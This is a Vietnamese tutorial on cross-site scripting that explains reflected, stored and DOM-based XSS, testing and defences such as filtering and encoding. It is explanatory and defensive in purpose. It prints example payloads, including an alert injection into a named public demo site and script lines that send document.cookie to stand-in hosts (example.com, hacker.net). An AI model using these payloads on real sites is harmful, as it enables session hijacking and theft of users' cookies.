# XSS

![](https://www.teknouzay.com/wp-content/uploads/2020/04/images1-660x330.png)

## 1. Cross-site scripting XSS là gì?

Cross-site scripting (a.k.a XSS) là một lỗ hổng bảo mật web phổ biến và dễ bị tấn công nhất cho phép kẻ tấn công thực thi script trên Client. 

Thông thường, các cuộc tấn công XSS được sử dụng để vượt qua truy cập và mạo danh người dùng.

Mục đích chính của cuộc tấn công này là ăn cắp dữ liệu nhận dạng của người dùng như: 

* cookies
* session 
* token 
* các thông tin khác.... 

Trong hầu hết các trường hợp, cuộc tấn công này đang được sử dụng để ăn cắp cookie của người khác. 

Như chúng ta biết, cookie giúp ta đăng nhập tự động. 

Do đó khi cookie bị đánh cắp, ta có thể đăng nhập bằng các thông tin nhận dạng khác. 

Và đây là một trong những lý do, tại sao cuộc tấn công này được coi là một trong những cuộc tấn công nguy hiểm nhất.

Tấn công XSS đang được thực hiện ở phía client. 

Nó có thể được thực hiện với các ngôn ngữ lập trình phía client khác nhau. 

Tuy nhiên, thường xuyên nhất cuộc tấn công này được thực hiện với `Javascript` và `HTML`.

## 2. XSS được thực hiện như thế nào?

Tấn công XSS là gửi và chèn script độc hại, những mã độc này được viết bằng các ngôn ngữ ở client như Javascript, HTML, CSS VBScript,... Tuy nhiên phổ biến nhất là Javascript và HTML. Có rất nhiều các thức để thực hiện cuộc tấn công này, phụ thuộc vào nhiều trường hợp khác nhau.

### a. Nguyên nhân

Nguyên nhân chính của loại tấn công này là xác thực đầu vào dữ liệu người dùng không phù hợp, dữ liệu độc hại từ đầu vào có thể xâm nhập vào dữ liệu đầu ra. 

Mã độc có thể nhập một script và được chèn vào source code của website. 

Khi đó trình duyệt không thể biết mã thực thi có phải độc hại hay không. 

Do đó mã độc hại có thể đang được thực thi trên trình duyệt của nạn nhận hoặc bất kỳ hình thức giả nào đang được hiển thị cho người sử dụng. 

Có một số hình thức tấn công XSS có thể xảy ra. Bên dưới là những hình thức tấn công chính của Cross Site Scripting:

* Trang web hoặc form giả mạo được hiển thị cho người dùng (nơi nạn nhân nhập thông tin đăng nhập hoặc nhấp vào liên kết độc hại).

* Cross Site Scripting có thể xảy ra trên tập lệnh độc hại được thực hiện ở phía client.

* Trên các trang web có quảng cáo được hiển thị.

* Email độc hại được gửi đến nạn nhân. Tấn công xảy ra khi tin tặc tìm kiếm những lỗ hổng trên website và gửi nó làm đầu vào độc hại. Tập lệnh độc hại được tiêm vào mã lệnh và sau đó được gửi dưới dạng đầu ra cho người dùng cuối cùng.

### b. Ví dụ

Lấy ví dụ đơn giản ở trang web thực tế trên trang web: 

https://demo.otobo.org/otobo/customer.pl

Ta sẽ inject script vào form search ticket:

![](https://i.imgur.com/BxzmQy4.png)

Chèn 

```html
<script>alert('hypnguyen1209')</script>
```

Result:

![](https://i.imgur.com/knPNGkw.png)

Tưởng tượng như kẻ tấn công sẽ thực hiện các script như lấy cookies từ người dùng như:

```html
<script>fetch(`http://example.com/hacked.php?xss=${document.cookie}`)</script>
```

Cookie sẽ bị lấy trên client và gửi đến trang example.com

## 3. Các loại tấn công XSS

### 1. Reflected XSS 

![](https://images.viblo.asia/full/6016fd6b-2ece-47b5-b07f-483b96365415.png)

![](https://images.viblo.asia/full/9aaa1faa-4b83-4a52-b205-54fdebde03ef.png)

Có nhiều hướng để khai thác thông qua lỗi Reflected XSS, một trong những cách được biết đến nhiều nhất là chiếm phiên làm việc (session) của người dùng, từ đó có thể truy cập được dữ liệu và chiếm được quyền của họ trên website:

![](https://images.viblo.asia/full/28e81cf8-c006-4835-9ef0-a8df7d2ccd12.jpg)

Kịch bản người dùng đăng nhập web và giả sử được gán session:

`Set-Cookie: accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiS0NTQyIsImlhdCI6MTUxNjIzOTAyMn0.HVLgiS3u6jOqluF49YMgKvzECd9B4xW0m8GMJuPFN2A`

Bằng một số cách nào đó hacker gửi được cho người dùng URl sau:

`https://banhang.com/name=let+i=new+Image;+i.src="http://hacker.net/"%2Bdocument.cookie`

Giả sử banhang.con là website nạn nhân truy cập, hacker.net là trang của hacker tạo ra

Nạn nhân truy cập đén URL trên

Server phẩn hồi lại cho nạn nhân, kèm theo dữ liệu có trong request  (đoạn javascript của hacker)

Trình duyệt của nạn nhân nhận phẩn hồi và thực thi đoạn javascript

```javascript

var i=new Image; 
i.src="http://hacker.net/”+document.cookie;"
```

đoạn javascript trên gọi đén request của hacker

```http
GET /accessToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiS0NTQyIsImlhdCI6MTUxNjIzOTAyMn0.HVLgiS3u6jOqluF49YMgKvzECd9B4xW0m8GMJuPFN2A HTTP/1.1
```

Từ trang web của mình hacker có thể bắt được nội dung của trang web trên mà cookie của người dùng đã bị đánh cắp. Từ đó hacker có thể thực hiện mọi quyền từ cookie của nạn nhân.

### 2. Stored XSS

Khác với Reflected tấn công trực tiếp vào một số nạn nhân mà hacker nhắm đến, Stored XSS hướng đến nhiều nạn nhân hơn. 

Lỗi này xảy ra khi ứng dụng web không kiểm tra kỹ các dữ liệu đầu vào trước khi lưu vào cơ sở dữ liệu (ở đây tôi dùng khái niệm này để chỉ database, file hay những khu vực khác nhằm lưu trữ dữ liệu của ứng dụng web). 

Ví dụ như các form góp ý, các comment… trên các trang web. 

Với kỹ thuật Stored XSS, hacker không khai thác trực tiếp mà phải thực hiện tối thiểu qua 2 bước.

Đầu tiên kể tấn công sẽ dựa vào các form input từ HTML không được kiểm tra kĩ đầu vào:

![](https://i.imgur.com/ApPdQJq.png)

Tiếp theo, khi người dùng truy cập vào ứng dụng web và thực hiện các thao tác liên quan đến dữ liệu được lưu này, đoạn script của hacker sẽ được thực thi trên trình duyệt người dùng.

Kịch bản khai thác:

![](https://images.viblo.asia/f0648231-6f0d-4bd7-988a-a471f2a05e37.png)


### 3. Sự khác biệt của Reflected XSS và Stored XSS

Để khai thác Reflected XSS, hacker phải lừa được nạn nhân truy cập vào url của mình. Còn Stored XSS không cần phải thực hiện việc này, sau khi chèn được script và CSDL, hacker chỉ việc ngồi chờ nạn nhân tự động truy cập vào. 

Với nạn nhân thì việc này hòa toàn là bình thường vì họ không hề hay biết dữ liệu của mình bị đánh cấp.

mục tiêu của hacker sẽ dễ dàng đạt được hơn nếu tại thời điểm tấn công nạn nhân vẫn trong phiên làm việc (session) của ứng dụng web. 

* Với Reflected XSS, hacker có thể thuyết phục hay lừa nạn nhân đăng nhập rồi truy cập đến URL mà hắn ta cung cấp để thực thi mã độc. 

* Nhưng Stored XSS thì khác, vì mã độc đã được lưu trong CSDL Web nên bất cứ khi nào người dùng truy cập các chức năng liên quan thì mã độc sẽ được thực thi, và nhiều khả năng là những chức năng này yêu cầu phải xác thực(đăng nhập) trước nên hiển nhiên trong thời gian này người dùng vẫn đang trong phiên làm việc.

### 4. DOM Based XSS

DOM Based XSS là kỹ thuật khai thác XSS dựa trên việc thay đổi cấu trúc DOM của tài liệu, cụ thể là HTML.

Ví dụ một website có URL như sau:

[http://example.com/register?message=Please%20fill%20in%20the%20form](http://example.com/register?message=Please%20fill%20in%20the%20form)

![](https://images.viblo.asia/full/2cfc5b4c-2e62-4ca3-9a0e-2a033830d3ff.png)

Thay vì truyền 

`message=Please%20fill%20in%20the%20form`

thì ta truyền

```
message=%3Clabel%3EGender%3C%2Flabel%3E%3Cselect%20class%20%3D%20%22form-control%22%20onchange%3D%22java_script_%3Ashow()%22%3E%3Coption%20value%3D%22Male%22%3EMale%3C%2Foption%3E%3Coption%20value%3D%22Female%22%3EFemale%3C%2Foption%3E%3C%2Fselect%3E%0A%3Cscript%3Efunction%20show()%7Balert()%3B%7D%3C%2Fscript%3E
```

Form mới sẽ thành:

![](https://images.viblo.asia/full/4bdaaffe-6e9f-4a3d-a980-309dfe6f2d44.png)

Form này như một form "bình thường":

![](https://images.viblo.asia/full/eca2b478-9da6-43f7-a48a-c98387898400.png)

Kịch bản khai thác:

![](https://images.viblo.asia/full/cc00ebb0-67cc-4110-91e4-4188104777fd.png)

### 5. Một số cách để kiểm thử tấn công XSS

Một số các script thông dụng mà tester hay pestest thường thử đển kiểm thử tấn công XSS như 

```html
<script>alert(document.cookie)</script>
```

Cheat Sheet tổng hợp tất cả các payload event tag:

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

Nếu script được thực hiện, thì có một khả năng rất lớn, rằng XSS là có thể. 

Ngoài ra, trong khi kiểm thử thủ công để có thể tấn công Cross Site Scripting, điều quan trọng cần nhớ là các dấu ngoặc được mã hóa cũng nên được thử.

Trong khi kiểm thử các cuộc tấn công có thể, điều quan trọng là kiểm tra xem nó đang được đáp ứng như thế nào với các kịch bản đã nhập và các kịch bản đó có được thực thi hay không

### 6. Một số cách để ngăn chặn XSS

Mặc dù loại tấn công này được coi là một trong những loại nguy hiểm và rủi ro nhất, nhưng vẫn nên chuẩn bị một kế hoạch ngăn ngừa. Bởi vì sự phổ biến của cuộc tấn công này, có khá nhiều cách để ngăn chặn nó.

Các phương pháp phòng ngừa chính được sử dụng phổ biến bao gồm:

* Data validation
* Filtering
* Escaping

Bước đầu tiên trong công tác phòng chống tấn công này là Xác thực input. Mọi thứ, được nhập bởi người dùng phải được xác thực chính xác. Xác thực dữ liệu có thể được đặt tên làm cơ sở để đảm bảo tính bảo mật của hệ thống. 

Vì vậy nó chỉ giúp giảm thiểu rủi ro, nhưng có thể không đủ để ngăn chặn lỗ hổng XSS có thể xảy ra.

Một phương pháp ngăn chặn tốt khác là lọc đầu vào của người dùng. 

Ý tưởng lọc là tìm kiếm các từ khóa nguy hiểm trong mục nhập của người dùng và xóa chúng hoặc thay thế chúng bằng các chuỗi trống. 

Những từ khóa đó có thể là:

* Cặp thẻ `<script></script>`

* Lệnh `javascript`

* Một số tag HTML

lọc đầu vào (input filtering) và lọc đầu ra (output filtering). Cách sử dụng phổ biến nhất là lọc đầu vào. 

Input Filtering được xem là chính xác hơn so với Output Filtering, đặc biệt trong trường hợp XSS Reflected. 

Tuy nhiên có một sự khác biệt nhỏ, quá trình lọc đầu vào áp dụng cho tất cả các loại dữ liệu, loại bỏ những nội dung không hợp lệ trong khi lọc đầu ra chỉ mang tính áp dụng lại, mục đích bài trừ các loại mã độc còn xót lại.

Có hai loại thanh lọc dữ liệu đầu vào và đẩu ra: **White-List Filtering** và **Black-List Filtering**

#### a. Black-List Filtering

Lọc dữ liệu được định nghĩa sẵn trong 1 danh sách cho trước, khi gặp 1 yêu cầu không hợp lệ sẽ hủy, không thực hiện yêu cầu. Ưu điểm là dễ cấu hình, triển khai nhưng nhược điểm là khi xuất hiện một cuộc tấn công kiểu mới (chưa được định nghĩa trong black-list) thì không thể phát hiện và ngăn chặn cuộc tấn công.

#### b. White-List Filtering

Cho phép quy định sẵn trước 1 danh sách hợp lệ, chỉ có những yêu cầu thuộc danh sách này mới được thực hiện. Vì thế ngăn chặn được các kiểu tấn công mới, nhược điểm là khi có một ứng dụng mới được phát triển thì cũng phải được cập nhật trong White-List. Tuy nhiên White-List Filtering bảo mật hơn so với Black-List Filtering.

#### c. Encoding Input

Mã hóa đầu vào có thể trở thành một vị trí trung tâm cho tất cả các bộ lọc, đảm bảo chỉ có một điểm duy nhất cho tất cả các bộ lọc.

Mã hóa phía máy chủ là một tiến trình mà tất cả nội dung phát sinh động sẽ đi qua một hàm mã hóa nơi mà các thẻ script sẽ được thay thể bởi mã của nó. 

Nói chung, việc mã hóa (encoding) được khuyến khích sử dụng vì nó không yêu cầu bạn phải đưa ra quyết định những kí tự nào là hợp lệ hoặc không hợp lệ.

Tuy nhiên việc mã hóa tất cả dữ liệu không đáng tin cậy có thể tốn tài nguyên và ảnh hưởng đến khả năng thực thi của một số máy chủ.

#### d. Encoding Output

Chuyển đổi đầu vào không tin cậy vào một hình thức an toàn, nơi đầu vào sẽ được hiển thị như dữ liệu cho người sử dụng mà không thực hiện được như đang trong trình duyệt.

## 4. Tóm tắt

Ngoài các biện pháp phòng tránh trên cũng chưa thể loại bỏ hết được Cross Site Scripting, lỗ hổng này không thể được loại bỏ hoàn toàn trong thời gian ngắn. Nhưng cũng phần nào hạn chế được lỗ hổng này xảy ra.

## 5. Tham khảo

* https://viblo.asia/p/ky-thuat-tan-cong-xss-va-cach-ngan-chan-YWOZr0Py5Q0

* https://viblo.asia/p/tan-cong-xss-va-cach-phong-chong-L4x5x09O5BM

* https://portswigger.net/web-security/cross-site-scripting

* https://portswigger.net/web-security/cross-site-scripting/cheat-sheet